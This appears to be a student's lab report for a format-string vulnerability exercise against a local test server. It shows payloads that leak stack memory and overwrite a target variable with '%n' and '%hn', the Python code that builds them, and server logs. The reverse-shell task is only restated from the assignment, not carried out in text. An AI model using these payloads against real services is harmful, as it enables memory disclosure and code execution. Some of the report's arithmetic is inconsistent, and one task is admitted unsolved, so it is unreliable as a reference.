# George Papadopoulos - gip200@nyu.edu

LAB 1, PART 2 SUBMISSION
-------------

## **Task 1 (5pts): Crashing the Program**

In this task, we examine how a remote buffer overflow is achieved. We are able to observe the case where upon passing a simple, short string like "hello" to the server process over the network, it does not seem to cause a problem and we see a clean return and positive message "(\^\_\^)(\^\_\^)  Returned properly (\^\_\^)(\^\_\^)". 

    server-10.9.0.5 | Got a connection from 10.9.0.1
    server-10.9.0.5 | Starting format
    server-10.9.0.5 | The input buffer's address:    0xffffd6f0  #(&buffer)
    server-10.9.0.5 | The secret message's address:  0x080b4008  secret
    server-10.9.0.5 | The target variable's address: 0x080e5068
    server-10.9.0.5 | Waiting for user input ......
    server-10.9.0.5 | Received 6 bytes.
    server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd618  ($ebp)
    server-10.9.0.5 | The target variable's value (before): 0x11223344
    server-10.9.0.5 | hello
    server-10.9.0.5 | The target variable's value (after):  0x11223344
    server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)

However, when we use the build_string.py script, we see simply using the supplied script with  "%.8x"*12 + **"%n"** in the  large 1500 byte message clearly DOES overflow the buffer. As noted, no proper response is returned if we  don't see the smiley faces, the format program has probably crashed, but in fact is respawned accordingly. Thus we see how a simple overflow will cause the server process to crash, we assume a segmentation fault has occured and the server respawned.



![enter image description here](https://github.com/gip200/gip200-appsec1/blob/main/Reports/Artifacts/gip200-lab1part2task1.jpg?raw=true)

## **Task 2 (10pts): Printing Out the Server Program's Memory**
 **_Task 2.A:_**  Stack Data. 

The values that are returned by the server program and prompt it out to give more addresses. We see that the address of ‘messages’ argument is printed out in the server output. Since the Return Address just 4 bytes below that, we can calculate the address of the return value as 0x080b4008 – 4 = 0x080b4004.

From trial and error with the build-string.py, applying s = "%.8x"*65 messages allows us to dump the memory+ "%s"

        # sending s = "%.8x"*65
        
        server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
    server-10.9.0.5 | Got a connection from 10.9.0.1
    server-10.9.0.5 | Starting format
    server-10.9.0.5 | The input buffer's address:    0xffffd7d0
    server-10.9.0.5 | The secret message's address:  0x080b4008
    server-10.9.0.5 | The target variable's address: 0x080e5068
    server-10.9.0.5 | Waiting for user input ......
    server-10.9.0.5 | Received 1500 bytes.
    server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd6f8
    server-10.9.0.5 | The target variable's value (before): 0x11223344
    server-10.9.0.5 | ����abcd112233440000100008049db5080e5320080e61c0ffffd7d0ffffd6f8080e62d4080e5000ffffd79808049f7effffd7d0000000000000006408049f47080e5320000005dc000005dcffffd7d0ffffd7d0080e9720000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003bc8ae00080e5000080e5000ffffddb808049effffffd7d0000005dc000005dc080e5320000000000000000000000000ffffde84000000000000000000000000000005dcbfffeeee64636261The target variable's value (after):  0x11223344

Note the last byte 64636261 reflects the hex values of our string 'abcd'. To find the address of the of the buffer start, we enter 4 bytes of random  characters - abcd whose ASCII value is known as 64636261 in little endian notation. These characters will be stored at the start of the buffer as they are the first characters and since this buffer is completely the value  given by the input. So, we enter the characters and multiple %.8x as the input to find the values stored in the addresses from the format string address to some random address, hopefully above  the buffer start. By trial and error, we  see that there is a difference of  65 %.8x between the start of the buffer address i.e. 'abcd' and the next address after the format  string address. This can be seen in the following screenshot:

![enter image description here](https://github.com/gip200/gip200-appsec1/blob/main/Reports/Artifacts/gip200-lab1part2task2a.jpg?raw=true)


**_Task 2.B:_**  Heap Data 

We need to pass an address in the past. If we want to output the data in the address, only %s can do it, and nothing else can. To that, we alter our build_string file to portray **s = "%.8x"*63 + "%s"**, and starting at our buffer address of 0xffffd7d0, and this allows us to generate the desired secret message, as shown.
 
![enter image description here](https://github.com/gip200/gip200-appsec1/blob/main/Reports/Artifacts/gip200-lab1part2task2b.jpg?raw=true)

## **Task 3 (5pts): Modifying the Server Program's Memory**

**Task 3.A:**

Using the original target address of 0x080e5068, we send the following string s = "%.8x"*63 + "%n", which produces a change in the target variable's value (after):  0x00000200, as per picture below.

![enter image description here](https://github.com/gip200/gip200-appsec1/blob/main/Reports/Artifacts/gip200-lab1part2task3a.jpg?raw=true)

**Task 3.B:**

To modify the value of target to 0x5000, since we know the target can already be set to 0x200, which is 0x5000 - 0x200 = 0x4E00 characters away from the target. Plus the original 8 characters that %.8x should output, so the last one should be filled with %.648x. 

HEX 5000 – 00000200 =  **4E00**  
Decimal:		20480 – 512 =  **19968**+8 = 19976

By passing **s = "%.8x"*62 + "%.19976x" + "%n"**, we get the desired result of changing the value to to a specific value 0x5000. As per picture below.
![enter image description here](https://github.com/gip200/gip200-appsec1/blob/main/Reports/Artifacts/gip200-lab1part2task3b.jpg?raw=true)

**Task 3.C:**

This part is to change the value of target to 0xAABBCCDD. We split 0xAABBCCDD into two parts, the front part is 0xAABB = 43707, the back is 52445. *Unfortunately*, I think I had the addresses correct for the upper and lower offsets, but could figure out the math to format the string to get the desired result.

    # Initialize the content array
    N = 1500
    content = bytearray(0x0 for i in range(N))
    
    # This line shows how to store a 4-byte integer at offset 0
    number  = 0x080e506a
    content[0:4]  =  (number).to_bytes(4,byteorder='little')
    
    # This line shows how to store a 4-byte string at offset 4
    content[4:8]  =  ("abcd").encode('latin-1')
    
    # This line shows how to store a 4-byte integer at offset 0
    number  = 0x080e5068
    content[8:12] =  (number).to_bytes(4,byteorder='little')
    
    # This line shows how to construct a string s with
    #   12 of "%.8x", concatenated with a "%n"
    s = "%.8x"*62 + "%.23743x" + "%hn" + "%.32481x" + "%hn"

front part													back part
Hex value:													Hex value:
AABB – 4E00 = 5CBB								CCDD – 4E00 = 7EDD

Decimal value:											Decimal value:
43707 – 19968 = 23739 + 8  - 4 			52445 – 19968 = 32477 + 8 - 4

![enter image description here](https://github.com/gip200/gip200-appsec1/blob/main/Reports/Artifacts/gip200-lab1part2task3c.jpg?raw=true)


## **Task 4 (10pts): Inject Malicious Code into the Server Program**

Please construct your input, feed it to the server program, and demonstrate that you can successfully get the server to run your shellcode. In your lab report, you need to explain how your format string is constructed. Please mark on Figure 1 where your malicious code is stored (please provide the concrete address).

Getting a Reverse Shell. We are not interested in running some pre-determined commands. We want to get a root shell on the target server, so we can type any command we want. Since we are on a remote machine, if we simply get the server to run /bin/bash, we won't be able to control the shell program. Reverse shell is a typical technique to solve this problem. Section 9 provides detailed instructions on how to run a reverse shell. Please modify the command string in your shellcode, so you can get a reverse shell on the target server. Please include screenshots and explanation in your lab report.

Refer to Section 9 in this README ("Informational Guidelines on Reverse Shell") as well Chapter 9 in the recommended textbook for more information about reverse shells.

![enter image description here](https://github.com/gip200/gip200-appsec1/blob/main/Reports/Artifacts/gip200-lab1part2task4.jpg?raw=true)

## **Task 5 (10pts): Attacking the 64-bit Server Program**
![enter image description here](https://github.com/gip200/gip200-appsec1/blob/main/Reports/Artifacts/gip200-lab1part2task5.jpg?raw=true)

## Task 6 (5pts): Fixing the Problem

![enter image description here](https://github.com/gip200/gip200-appsec1/blob/main/Reports/Artifacts/gip200-lab1part2task6.jpg?raw=true)

## END OF LAB 1, PART 2 SUBMISSION
